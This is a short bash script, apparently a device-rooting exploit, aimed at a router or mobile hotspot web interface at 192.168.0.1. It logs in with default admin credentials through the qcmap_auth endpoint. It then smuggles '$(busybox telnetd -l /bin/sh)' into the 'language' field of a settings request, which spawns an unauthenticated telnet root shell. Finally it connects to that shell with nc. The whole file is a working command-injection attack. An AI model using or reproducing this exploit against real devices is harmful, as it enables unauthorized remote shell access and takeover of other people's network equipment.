#!/usr/bin/env bash

nonce=$(curl -s 'http://192.168.0.1/cgi-bin/qcmap_auth' -X POST  -d '{"module":"authenticator","action":0}' | jq -r .nonce)
if [[ $(uname) == 'Linux' ]]; then
    md5=$(printf "%s:%s:%s" ${1-admin} ${2-admin} "$nonce" | md5sum | cut "-d " -f1)
elif [[ $(uname) == 'Darwin' ]]; then
    md5=$(printf "%s:%s:%s" ${1-admin} ${2-admin} "$nonce" | md5 | cut "-d " -f1)
fi
printf "Nonce: %s\nMD5: %s\n" "$nonce" "$md5"

token=$(curl -s 'http://192.168.0.1/cgi-bin/qcmap_auth' -d '{"module":"authenticator","action":1,"digest":"'"$md5"'"}' | jq -r .token)

printf "Token: %s\n" "$token"

curl -s 'http://192.168.0.1/cgi-bin/qcmap_web_cgi' -b "tpweb_token=$token" -d '{"token":"'"$token"'","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}' > /dev/null
curl -s 'http://192.168.0.1/cgi-bin/qcmap_web_cgi' -b "tpweb_token=$token" -d '{"token":"'"$token"'","module":"webServer","action":1,"language":"en"}' > /dev/null

echo Done.

if [[ $(uname) == 'Linux' ]]; then
    (stty -icanon -echo; nc -O1 192.168.0.1 23)
elif [[ $(uname) == 'Darwin' ]]; then
    (stty -icanon -echo; nc -O 192.168.0.1 23)
fi
stty icanon echo
